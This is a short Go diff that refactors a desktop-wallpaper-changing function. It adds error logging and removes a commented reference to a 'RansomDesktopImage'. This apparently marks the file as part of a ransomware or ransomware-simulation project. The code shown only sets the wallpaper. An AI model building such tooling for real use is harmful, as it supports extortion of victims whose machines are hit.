@@ -7,12 +7,6 @@ import (
 	"runtime"
 )
 
-const (
-	SPI_SETDESKWALLPAPER = 0x0014
-	SPIF_UPDATEINIFILE   = 0x01
-	SPIF_SENDCHANGE      = 0x02
-)
-
 func ChangeBackgroundImage() {
 	currentWorkingDirectory, err := os.Getwd()
 	if err != nil {
@@ -23,8 +17,9 @@ func ChangeBackgroundImage() {
 	// Change desktop background
 	switch runtime.GOOS {
 	case "windows":
-		// imagePath = os.Getwd() + "\\" + RansomDesktopImage
-		changeWindowsBackground(imagePath)
+		if err := changeWindowsBackground(imagePath); err != nil {
+			log.Println("[-] Failed to set wallpaper on Windows:", err)
+		}
 	case "linux":
 		changeLinuxBackground(imagePath)
 	default:
